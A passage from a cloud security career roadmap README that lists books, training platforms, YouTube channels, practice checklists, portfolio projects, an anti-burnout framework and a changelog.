| 4 | *Terraform: Up & Running* | Yevgeniy Brikman | IaC (Ch. 1–4 first, rest later) | Phase 2 |
| 5 | *Threat Modeling* | Adam Shostack | STRIDE for all projects | Phase 1–3 |
| 6 | *Practical Cloud Security* | Chris Dotson | Azure + AWS comparison | Phase 2–3 |
| 7 | *Identity Attack Vectors* | Roger Grimes | Identity security depth | Phase 3 |
| 8 | *Zero Trust Networks* | Gilman & Barth | ZT beyond Microsoft | Phase 4 |
| 9 | *CSA Security Guidance v4* | Cloud Security Alliance | CCSK + governance | Phase 4 |
| 10 | *Security Engineering* | Ross Anderson (3rd Ed.) | Architecture thinking | Phase 5 |

### Additional Reading

| Title | Author(s) | When |
|-------|-----------|------|
| *Blue Team Handbook: IR Edition* | Don Murdoch | Phase 3 |
| *Hacking Kubernetes* | Martin & Hausenblas | Phase 2–3 |
| *Cybersecurity First Principles* | Tarandach | Phase 3–4 |
| *The Web Application Hacker's Handbook* | Stuttard & Pinto | Phase 3 |
| *The Code Book* | Simon Singh | Anytime (motivation) |

---

## Hands-On Platforms

| Platform | Focus | Cost | Priority |
|----------|-------|------|----------|
| [TryHackMe](https://tryhackme.com) | Guided security learning | Free tier + $14/mo | ⭐⭐⭐ |
| [Pwned Labs](https://pwnedlabs.io) | Cloud security attack & defense | $25–50/mo | ⭐⭐⭐ |
| [HackTheBox Academy](https://academy.hackthebox.com) | Structured cybersecurity modules | Free tier + paid | ⭐⭐ |
| [PortSwigger Web Security Academy](https://portswigger.net/web-security) | Web app security labs | **Free!** | ⭐⭐⭐ |
| [CryptoHack](https://cryptohack.org) | Crypto challenges | **Free!** | ⭐⭐ |
| [CryptoPals](https://cryptopals.com) | Crypto programming challenges | **Free!** | ⭐⭐ |
| [OverTheWire](https://overthewire.org/wargames/) | Linux, networking, crypto wargames | **Free!** | ⭐⭐ |
| [KillerCoda](https://killercoda.com) | Interactive K8s and Docker labs | **Free!** | ⭐⭐ |
| [Microsoft Learn](https://learn.microsoft.com) | Azure, M365, Security paths | **Free!** | ⭐⭐⭐ |
| [Malware Traffic Analysis](https://www.malware-traffic-analysis.net) | PCAP analysis exercises | **Free!** | ⭐⭐ |
| [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) | Vulnerable web app | **Free!** | ⭐⭐ |
| [O'Reilly](https://www.oreilly.com) | Books, videos, interactive labs | Subscription | ⭐⭐⭐ |
| [Pluralsight](https://www.pluralsight.com) | Video courses | Subscription | ⭐⭐ |

---

## YouTube Channels & Free Courses

### Security-Focused Channels

| Channel | Focus | Level |
|---------|-------|-------|
| [John Savill](https://www.youtube.com/@NTFAQGuy) | Azure deep dives, AZ-104, SC-300 | Intermediate–Advanced |
| [Professor Messer](https://www.professormesser.com) | CompTIA Security+, Network+ | Beginner |
| [The Cyber Mentor](https://www.youtube.com/@TCMSecurityAcademy) | Ethical hacking | Beginner–Intermediate |
| [NetworkChuck](https://www.youtube.com/@NetworkChuck) | Networking, Linux, security | Beginner |
| [Black Hat](https://www.youtube.com/@BlackHatOfficialYT) | Conference talks | Advanced |
| [SANS Institute](https://www.youtube.com/@SANSInstitute) | Professional training | All levels |
| [Christof Paar](https://www.youtube.com/channel/UC1usFRN4LCMcfIV7UjHNuQg) | University-level cryptography | Intermediate |
| [13Cubed](https://www.youtube.com/@13Cubed) | DFIR, forensics | Intermediate–Advanced |
| [LiveOverflow](https://www.youtube.com/@LiveOverflow) | Hacking, CTF, offense→defense | Intermediate |
| [John Hammond](https://www.youtube.com/@_JohnHammond) | CTF, malware analysis, hacking | Intermediate |

### Free Courses

| Course | Platform | Phase |
|--------|----------|-------|
| AZ-104 Learning Path | Microsoft Learn | 2 |
| SC-300 Learning Path | Microsoft Learn | 3 |
| SC-500 Learning Path | Microsoft Learn | 3 |
| AWS Cloud Practitioner Essentials | AWS | 4 |
| Terraform Tutorials | HashiCorp Learn | 2, 5 |

---

## Ongoing Practice

These activities should be continuous throughout all phases:

### Weekly

- [ ] Read 1 security article (Krebs on Security, The Hacker News, Schneier on Security)
- [ ] Complete 1 TryHackMe room or HackTheBox module
- [ ] Write 1 KQL detection query and test it (from Phase 3)
- [ ] Review 1 MITRE ATT&CK technique and map it to a cloud scenario (from Phase 3)

### Monthly

- [ ] Complete 1 Pwned Labs cloud security lab (from Phase 2)
- [ ] Write 1 blog post or documentation page about what you learned
- [ ] Review and update your personal knowledge base
- [ ] Check for new Azure security features/announcements

### Quarterly

- [ ] Run a security assessment against your lab environment
- [ ] Update your roadmap based on progress
- [ ] Take a practice exam for your next certification target
- [ ] Attend a virtual security meetup or webinar

---

## Portfolio Projects

Six projects that demonstrate progression from fundamentals to architecture. Each project has a `/docs/concepts/` directory with vendor-neutral concept documentation.

| # | Project | Phase | Languages | Key Deliverables |
|---|---------|-------|-----------|-----------------|
| 1 | `security-foundations-lab` | 1 | Python | 3+ CLI tools, pytest suite, cheatsheet |
| 2 | `azure-security-baseline-lab` | 2 | Terraform + Python | Terraform-deployed lab, AKS cluster, concept docs |
| 3 | `azure-security-hardening-lab` | 3 | Terraform + Python + KQL | Defender Secure Score 80%+, KQL queries, SIGMA rules |
| 4 | `entra-governance-toolkit` ⭐ | 3 | Python | 5+ governance checks, STRIDE threat model, demo GIF |
| 5 | `cloud-controls-mapping` | 4 | Markdown + YAML + Python | CSA CCM mapping, DORA reference, control reporter |
| 6 | `regulated-cloud-reference-architecture` ⭐ | 5 | Terraform + Markdown | Landing zone, threat model, regulatory mapping |

### Project Principles

- Every project has a README that answers: "What is X?" → "How I solved it" → "Concepts that transfer"
- Every cloud project contains at least one container/AKS element
- Every project from Phase 3+ includes an AI security consideration
- Code quality: CLI + logging + error handling + README + tests

---

## 🛡 Anti-Burnout Framework

> This is not optional. Burnout will derail your plan faster than any failed exam.

**Monthly health check:**
- [ ] Sleeping 6+ hours consistently?
- [ ] Any academic backlog building up?
- [ ] 2+ zero-weeks in a row?
- [ ] Feeling overwhelmed?
- [ ] Social life intact (friends, family, hobbies)?
- [ ] Making progress or just consuming content?
- [ ] Still enjoying the learning?

**🟡 Yellow (1–2 red):** Cut project work by 50%, reduce cert pressure, no new resources.

**🔴 Red (3+ red):** Only day job + university. Max 4h/week security. Hold for minimum 2 weeks.

**Built-in breaks:**
- Buffer months between phases (max 6h/week, no new material)
- 2 weeks off at Christmas
- 1 week off after every exam (no new topics)

---

## How to Track Progress

1. Fork this repo
2. Create a branch: `git checkout -b my-progress`
3. Check off items: `[x]`
4. Commit regularly: `git commit -am "Phase 1.3 — Cryptography complete"`
5. Keep a learning journal alongside this checklist

**Estimated total items:** ~400+ checkboxes across all phases.

**Remember:** The goal is not to rush through checkboxes. The goal is to understand deeply enough that you could **explain each concept to a colleague, implement it in a lab, and defend it in an architecture review.**

---

## Changelog

### v2.0 (March 2026)
- Restructured from scratch in "coding-interview-university" format
- Merged career execution plan with deep fundamentals curriculum
- Added AI Security as cross-cutting theme from Phase 3
- Added container/Kubernetes minimum for all cloud projects
- Replaced AZ-500 with SC-500 (AZ-500 retired August 2026)
- Added Applied Skills Credentials as bonus milestones
- Added Anti-Burnout Framework
- Added Portfolio Projects section with 6 structured projects
- Cert balance: 3 Microsoft + 3 vendor-neutral

### v1.0 (January 2026)
- Initial version

---

## Contributing

Found a broken link? Have a better resource? Think a topic is missing? PRs are welcome.

Please keep contributions focused on:
- Fixing broken or outdated links
- Adding free, high-quality resources
- Improving examples or explanations
- Correcting technical inaccuracies

---

## License

This work is licensed under [CC BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/). You are free to share and adapt this material for any purpose, including commercially, as long as you give appropriate credit and distribute your contributions under the same license.

---

<p align="center">
  <i>If this helped you, give it a ⭐ and share it with someone starting their security journey.</i>
</p>
